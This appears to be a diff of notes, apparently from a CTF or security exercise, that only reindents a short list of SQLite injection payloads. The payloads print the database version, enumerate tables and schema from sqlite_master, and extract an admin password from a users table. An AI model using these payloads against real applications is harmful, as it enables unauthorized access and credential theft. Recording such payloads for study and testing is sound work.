@@ -21,13 +21,13 @@ Examples
 
 sqlite version:
 
-  a' || (select sqlite_version()));--
+    a' || (select sqlite_version()));--
   
 Table name enumeration
   
-  a' || (SELECT name FROM sqlite_master WHERE type='table'));--
-  a' || (select sql from sqlite_master));--
+    a' || (SELECT name FROM sqlite_master WHERE type='table'));--
+    a' || (select sql from sqlite_master));--
 
 Leak Password
 
-  a' || (select password from xde43_users where role="admin"));--
+    a' || (select password from xde43_users where role="admin"));--
